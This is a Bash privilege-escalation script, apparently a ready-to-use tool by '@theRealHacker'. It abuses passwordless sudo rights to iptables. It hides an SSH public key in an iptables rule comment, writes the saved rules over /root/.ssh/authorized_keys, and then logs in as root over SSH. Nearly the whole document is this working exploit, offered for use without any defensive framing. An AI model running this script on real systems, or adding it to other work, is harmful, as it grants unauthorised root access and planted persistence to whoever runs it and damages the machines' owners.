#!/bin/bash
banner() {
    echo "╔══════════════════════════════╗"
    echo "║     IPTABLES PRIV ESCer      ║"
    echo "╚══════════════════════════════╝"
    echo -e "\t\tby @theRealHacker"; echo ""
}
initsudo() {
    init=$(sudo -l)
    if echo "$init" | grep -Eq '(NOPASSWD: /usr/sbin/iptables|NOPASSWD: /usr/sbin/iptables)'; then
        echo "[+] Target might be vulnerable"
    elif echo "$init" | grep -q "NOPASSWD: ALL"; then
        echo "[!] $USER has NOPASSWD: ALL privilege"
        echo "[!] Target is bound to be vulnerable"
    elif echo "$init" | grep -q "(ALL : ALL) ALL"; then
        echo "[!] $USER is root!"
    else
        echo -e "[-] Target might NOT be vulnerable"
    fi
}
makeKey() {
    ssh-keygen -t ed25519 -b 4096 -f privesc_key || { echo "ERROR"; exit 1; }
    echo -n "[*] Created key (copy this): $PWD"; echo "/privesc_key.pub"
}
listKeys() {
    echo "[*] Available keys in $HOME: "
    out=$(find ~ -type f -name "*.pub" 2>/dev/null)
    if [ -z "$out" ]; then
        echo -e "[-]\tNone"
        echo -en "[?] Create a new SSH key? (Y/n): "
        read -srn1 answer; echo ""
        if [[ "$answer" =~ ^[Yy]$ ]] || [ -z "$answer" ]; then
            makeKey
        fi
    else
        echo "$out" | while read -r key; do
            echo -e "[+]\t$key"
        done
        echo -n "[?] Create a new SSH key anyway? (y/N): "
        read -srn1 answer; echo ""
        if [[ "$answer" =~ ^[Yy]$ ]]; then
            makeKey
        fi
    fi
}
chooseKey() {
    echo -n "[?] Public key to use: "; read -r sshkey
    if [ ! -f "$sshkey" ] || [[ ! "$sshkey" =~ \.pub$ ]]; then
        echo "[!] Invalid public key file. Exiting."
        exit 1
    fi
    privkey=$(echo "$sshkey" | sed 's/\.pub$//g')
}
chooseTarget() {
    echo -n "[?] Target file (default: /root/.ssh/authorized_keys): "
    read -r target
    if [ -z "$target" ]; then
        targetfile="/root/.ssh/authorized_keys"
        echo "[*] Target file is set to $targetfile"
    elif [ ! -f "$target" ]; then
        echo "[!] $targetfile does not exist."
        echo -n "[?] Continue anyway? (y/N): "
        read -srn1 answer; echo ""
        if [[ $answer =~ ^[Yy]$ ]]; then
            targetfile="$target"
            touch "$targetfile"
        else
            echo "[!] Exiting."
            exit 0
        fi
    else
        targetfile="$target"
        echo "[*] Target file is set to $targetfile"
    fi
}
inject_save() {
    payload=$(cat "$sshkey")
    echo "[*] Injecting rule to iptables"
    sudo iptables -A INPUT -m comment --comment $'\n'"$payload"
    echo "[*] Saving iptables rule to $targetfile"
    sudo iptables-save -f "$targetfile" || { echo "[!] Failed to write to $targetfile. Check your perms"; exit 1; }
    echo "[+] Success!"
    if [ "$initssh" = true ]; then
        echo "[*] Attempting to login as root."
        ssh -i "$privkey" root@127.0.0.1
    fi
}
cleanUpOption() {
    echo -n "[?] Flush iptables? (Y/n): "
    read -srn1 answer; echo ""
    if [[ "$answer" =~ ^[Yy]$ ]] || [ -z "$answer" ]; then
        sudo iptables -F && echo "[*] Flushed iptable successfully."
        exit 0
    else
        echo "[*] Exiting."
        exit 0
    fi
}
PrivEsc() {
    echo "[*] Starting PrivEsc."
    if [ $targetfile = "/root/.ssh/authorized_keys" ]; then
        initssh=true
        inject_save 2>/dev/null
    else
        initssh=false
        inject_save 2>/dev/null
    fi
}
banner
initsudo
listKeys
chooseKey
chooseTarget
PrivEsc
cleanUpOption
# Will try to remove the " at the end of the injection but it still works as is.